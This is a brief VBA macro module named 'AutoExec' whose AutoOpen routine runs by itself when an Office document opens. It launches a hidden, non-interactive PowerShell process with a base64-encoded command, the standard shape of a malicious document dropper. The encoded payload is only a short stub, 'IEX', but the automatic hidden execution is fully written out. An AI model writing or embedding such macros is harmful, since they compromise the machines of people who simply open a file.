Attribute VB_Name = "AutoExec"
Sub AutoOpen()
    Dim shellObj As Object
    Set shellObj = CreateObject("WScript.Shell")
    shellObj.Run "powershell.exe -NoP -NonI -W Hidden -Enc SUVY", 0
End Sub
